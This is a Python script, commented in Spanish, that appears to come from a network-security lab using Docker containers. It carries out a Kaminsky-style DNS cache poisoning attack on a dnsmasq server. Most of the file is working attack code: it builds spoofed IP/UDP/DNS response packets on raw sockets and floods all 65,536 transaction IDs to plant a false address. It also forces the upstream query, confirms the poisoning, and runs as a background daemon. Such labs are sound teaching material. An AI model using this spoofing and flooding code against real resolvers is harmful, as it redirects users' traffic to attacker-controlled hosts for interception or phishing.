#!/usr/bin/env python3
"""
Ataque 5 — DNS Cache Poisoning (atac de Kaminsky)

Mecanismo (sin acceso admin al servidor DNS):
  1. dnsmasq esta configurado con server=/lab-external.com/192.168.5.200
     (upstream inexistente) y query-port=5353 (puerto fijo de salida,
     simulando la vulnerabilidad previa a la mitigacion RFC 5452).
  2. John envia una query DNS a dnsmasq por lab-external.com.
     dnsmasq no tiene la respuesta en cache y reenvía la query a
     192.168.5.200:53 usando TxID aleatorio y puerto fuente 5353.
  3. John inunda dnsmasq con 65536 respuestas UDP falsificadas desde
     192.168.5.200:53 → 192.168.3.2:5353, probando todos los TxID
     posibles (0-65535). Usa raw sockets para maxima velocidad.
  4. Una respuesta coincide con el TxID de la query pendiente de dnsmasq.
     dnsmasq la acepta y cachea la IP falsa (192.168.1.100) para el dominio.
  5. Todos los clientes que consulten dnsmasq reciben la IP de John.
     El envenenamiento persiste hasta que expire el TTL o se haga SIGHUP.

Diferencia con la configuracion manual previa:
  John no tiene acceso al servidor DNS. Explota la ventana de tiempo entre
  la query de dnsmasq al upstream inexistente y el timeout, enviando una
  respuesta forjada con el TxID correcto antes de que expire.

Stop: mata el daemon. Cache persiste hasta SIGHUP o TTL.

Uso: python3 attack_dns.py [start|stop|status]
"""

import sys
import os
import signal
import time
import socket
import struct
import random

PID_FILE = "/tmp/attack_dns.pid"
LOG_FILE = "/tmp/attack_dns.log"

DNS_IP          = "192.168.3.2"    # dnsmasq
DNS_QUERY_PORT  = 5353             # puerto fijo de salida de dnsmasq (query-port=5353)
FAKE_UPSTREAM   = "192.168.5.200"  # upstream inexistente configurado en dnsmasq
TARGET_DOMAIN   = "lab-external.com"
FAKE_IP         = "192.168.1.100"  # IP de John en N1
TTL_POISON      = 30               # segundos que dnsmasq cachea la respuesta


# ── Construccion de paquetes ─────────────────────────────────────────────────

def _encode_qname(domain):
    encoded = b""
    for part in domain.rstrip(".").split("."):
        encoded += bytes([len(part)]) + part.encode()
    return encoded + b"\x00"


def _ip_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack(">" + "H" * (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def build_dns_response_bytes(txid, domain, fake_ip, ttl,
                              src_ip, dst_ip, src_port, dst_port):
    """
    Construye un paquete IP+UDP+DNS completo con checksum correcto.
    Spoofea src_ip (FAKE_UPSTREAM) como origen.
    """
    qname = _encode_qname(domain)

    # DNS payload: cabecera + pregunta + respuesta A
    dns = (
        struct.pack(">H", txid) +
        b"\x85\x80" +                              # QR=1, AA=1, RD=1, RA=1
        struct.pack(">HHHH", 1, 1, 0, 0) +         # counts
        qname + struct.pack(">HH", 1, 1) +          # question: QTYPE=A, QCLASS=IN
        qname +                                     # answer rrname
        struct.pack(">HHiH", 1, 1, ttl, 4) +        # TYPE=A, CLASS=IN, TTL, RDLEN=4
        socket.inet_aton(fake_ip)
    )

    # UDP (checksum=0: opcional en IPv4, aceptado por dnsmasq)
    udp_len = 8 + len(dns)
    udp = struct.pack(">HHHH", src_port, dst_port, udp_len, 0) + dns

    # IP header (sin checksum primero)
    ip_len = 20 + len(udp)
    ip_hdr = struct.pack(
        ">BBHHHBBH4s4s",
        0x45, 0, ip_len,
        txid & 0xFFFF,          # IP ID (reutilizamos txid)
        0x4000,                 # Don't fragment
        64, 17, 0,              # TTL=64, proto=UDP, checksum=0 (calculamos despues)
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
    )
    csum = _ip_checksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack(">H", csum) + ip_hdr[12:]

    return ip_hdr + udp


# Pre-construye el paquete template con txid=0 para modificar en el bucle
_TEMPLATE = build_dns_response_bytes(
    txid=0,
    domain=TARGET_DOMAIN,
    fake_ip=FAKE_IP,
    ttl=TTL_POISON,
    src_ip=FAKE_UPSTREAM,
    dst_ip=DNS_IP,
    src_port=53,
    dst_port=DNS_QUERY_PORT,
)
# Offsets donde cambia el TxID en el paquete precompilado:
#   IP ID:   bytes [4:6]
#   DNS TxID: IP(20) + UDP(8) = offset 28, bytes [28:30]
_IP_ID_OFF  = 4
_DNS_TXI_OFF = 28
# El checksum IP incluye el campo ID: hay que recalcularlo por cada txid.
# En lugar de recalcular, ponemos checksum=0 en IP y dejamos que el kernel
# lo rellene cuando usamos IP_HDRINCL=0... pero con IPPROTO_RAW+IP_HDRINCL=1
# necesitamos recalcular. Para velocidad, pre-calculamos una tabla de
# ajuste de checksum (delta):
_BASE_IP_CSUM = struct.unpack(">H", _TEMPLATE[10:12])[0]


def _patch_packet(txid):
    """Modifica solo los bytes que cambian con el TxID (muy rapido)."""
    pkt = bytearray(_TEMPLATE)
    # Actualizar IP ID
    pkt[_IP_ID_OFF]     = (txid >> 8) & 0xFF
    pkt[_IP_ID_OFF + 1] = txid & 0xFF
    # Actualizar DNS TxID
    pkt[_DNS_TXI_OFF]     = (txid >> 8) & 0xFF
    pkt[_DNS_TXI_OFF + 1] = txid & 0xFF
    # Recalcular IP checksum (solo cambia el campo ID, 2 bytes en offset 4)
    # Usamos incremento de checksum: new_csum = ~(~old_csum - old_id + new_id)
    old_id = 0  # id del template era 0
    new_id = txid
    new_csum = (~(_BASE_IP_CSUM - (~old_id & 0xFFFF) + new_id)) & 0xFFFF
    pkt[10] = (new_csum >> 8) & 0xFF
    pkt[11] = new_csum & 0xFF
    return bytes(pkt)


# ── Trigger y verificacion ───────────────────────────────────────────────────

def _dns_query_bytes(txid, domain):
    qname = _encode_qname(domain)
    return (struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0) +
            qname + struct.pack(">HH", 1, 1))


def trigger_upstream_query():
    """Envia una query a dnsmasq para forzar que consulte el upstream."""
    txid = random.randint(0, 65535)
    payload = _dns_query_bytes(txid, TARGET_DOMAIN)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.05)
    try:
        sock.sendto(payload, (DNS_IP, 53))
        sock.recv(512)
    except Exception:
        pass
    finally:
        sock.close()


def check_poisoned():
    """Devuelve True si dnsmasq ya resuelve TARGET_DOMAIN con FAKE_IP."""
    txid = random.randint(0, 65535)
    payload = _dns_query_bytes(txid, TARGET_DOMAIN)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)
    try:
        sock.sendto(payload, (DNS_IP, 53))
        data, _ = sock.recvfrom(512)
        # Parsear respuesta: buscar ANCOUNT > 0 y rdata
        ancount = struct.unpack(">H", data[6:8])[0]
        if ancount < 1:
            return False
        # Extraer la primera respuesta A: saltamos header(12) + question
        # Parsear qname variable para encontrar el inicio de la respuesta
        pos = 12
        while pos < len(data) and data[pos] != 0:
            if data[pos] & 0xC0 == 0xC0:  # compression pointer
                pos += 2
                break
            pos += data[pos] + 1
        else:
            pos += 1  # null byte final del qname
        pos += 4  # QTYPE + QCLASS
        # Respuesta: saltar rrname (puede ser pointer)
        if data[pos] & 0xC0 == 0xC0:
            pos += 2
        else:
            while data[pos] != 0:
                pos += data[pos] + 1
            pos += 1
        rtype = struct.unpack(">H", data[pos:pos+2])[0]
        pos += 8  # TYPE + CLASS + TTL
        rdlen = struct.unpack(">H", data[pos:pos+2])[0]
        pos += 2
        if rtype == 1 and rdlen == 4:
            rdata = socket.inet_ntoa(data[pos:pos+4])
            return rdata == FAKE_IP
    except Exception:
        pass
    finally:
        sock.close()
    return False


# ── Bucle principal del ataque ───────────────────────────────────────────────

def attack_loop():
    print(f"[DNS] Iniciando ataque Kaminsky contra dnsmasq ({DNS_IP})", flush=True)
    print(f"[DNS] Dominio objetivo: {TARGET_DOMAIN}", flush=True)
    print(f"[DNS] Upstream ficticio: {FAKE_UPSTREAM}  Puerto query: {DNS_QUERY_PORT}", flush=True)
    print(f"[DNS] IP inyectada: {FAKE_IP}  TTL: {TTL_POISON}s", flush=True)

    # Raw socket para maxima velocidad de envio
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    def flood_once():
        """Envia los 65536 paquetes en orden aleatorio (mejor distribucion)."""
        txids = list(range(65536))
        random.shuffle(txids)
        sent = 0
        for txid in txids:
            raw_sock.sendto(_patch_packet(txid), (DNS_IP, 0))
            sent += 1
        print(f"[DNS] Flood completado: {sent} paquetes enviados", flush=True)

    poisoned = False
    for attempt in range(1, 8):
        print(f"[DNS] Intento {attempt}: trigger + flood...", flush=True)
        trigger_upstream_query()
        flood_once()
        time.sleep(0.4)
        if check_poisoned():
            poisoned = True
            print(f"[DNS] POISONED! dnsmasq resuelve {TARGET_DOMAIN} → {FAKE_IP}", flush=True)
            break
        print(f"[DNS] Intento {attempt} sin exito, esperando expiración negativa...", flush=True)
        time.sleep(1.2)  # esperar que expire el SERVFAIL en cache de dnsmasq

    raw_sock.close()

    if not poisoned:
        print(f"[DNS] ADVERTENCIA: cache no envenenada tras 7 intentos.", flush=True)

    def handle_sigterm(sig, frame):
        print("[DNS] Detenido. Cache de dnsmasq persiste hasta SIGHUP o TTL.", flush=True)
        sys.exit(0)

    signal.signal(signal.SIGTERM, handle_sigterm)
    while True:
        time.sleep(60)


# ── start / stop / status ────────────────────────────────────────────────────

def start():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        print(f"[!] El ataque ya esta activo (PID {pid}). Para primero con 'stop'.")
        sys.exit(1)

    pid = os.fork()
    if pid > 0:
        open(PID_FILE, "w").write(str(pid))
        print(f"[+] DNS Cache Poisoning (Kaminsky) iniciado (PID {pid})")
        print(f"    Objetivo: {DNS_IP} — dominio: {TARGET_DOMAIN}")
        print(f"    Flood: 65536 TxIDs contra {DNS_IP}:{DNS_QUERY_PORT} desde {FAKE_UPSTREAM}:53")
        print(f"    Verifica: docker exec alice nslookup {TARGET_DOMAIN} {DNS_IP}")
        print(f"    Cleanup:  docker exec dns sh -c 'kill -HUP $(pidof dnsmasq)'")
        print(f"    Log: tail -f {LOG_FILE}")
        sys.exit(0)

    os.setsid()
    sys.stdout = open(LOG_FILE, "w", buffering=1)
    sys.stderr = sys.stdout
    attack_loop()


def stop():
    if not os.path.exists(PID_FILE):
        print("[-] El ataque no esta activo.")
        return

    pid = int(open(PID_FILE).read().strip())
    try:
        os.kill(pid, signal.SIGTERM)
        time.sleep(1)
        if os.path.exists(f"/proc/{pid}"):
            os.kill(pid, signal.SIGKILL)
    except ProcessLookupError:
        print("[!] Proceso no encontrado, limpiando PID file.")

    os.remove(PID_FILE)
    print(f"[+] DNS Cache Poisoning detenido.")
    print(f"    Cache de dnsmasq persiste (TTL={TTL_POISON}s).")
    print(f"    Para vaciar: docker exec dns sh -c 'kill -HUP $(pidof dnsmasq)'")


def status():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        alive = os.path.exists(f"/proc/{pid}")
        state = "activo" if alive else "PID file huerfano"
        print(f"[*] DNS Cache Poisoning: {state} (PID {pid})")
        print(f"    Objetivo: {DNS_IP}:{DNS_QUERY_PORT}  Upstream fake: {FAKE_UPSTREAM}")
        print(f"    Log: tail -f {LOG_FILE}")
    else:
        print("[-] DNS Cache Poisoning: inactivo")


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in ("start", "stop", "status"):
        print(f"Uso: {sys.argv[0]} [start|stop|status]")
        sys.exit(1)
    {"start": start, "stop": stop, "status": status}[sys.argv[1]]()
